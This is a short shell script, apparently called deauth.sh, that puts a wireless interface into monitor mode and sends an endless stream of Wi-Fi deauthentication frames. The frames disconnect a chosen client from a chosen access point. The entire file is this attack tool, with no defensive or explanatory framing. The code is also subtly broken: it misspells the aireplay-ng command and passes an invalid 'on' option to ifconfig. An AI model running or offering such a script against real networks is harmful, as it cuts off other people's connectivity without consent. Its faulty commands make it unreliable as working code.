#!/bin/sh

name="wlan0"
if [ $# -ne 2 ]
then
	echo "Usage: ./deauth.sh [Client MAC] [AP MAC]"
	exit 1
fi
clientmac="$1"
apmac="$2"

ifconfig $name on
airmon-ng start $name
aireply-ng --deauth 0 -c "$clientmac" -a "$apmac" "$name"mon
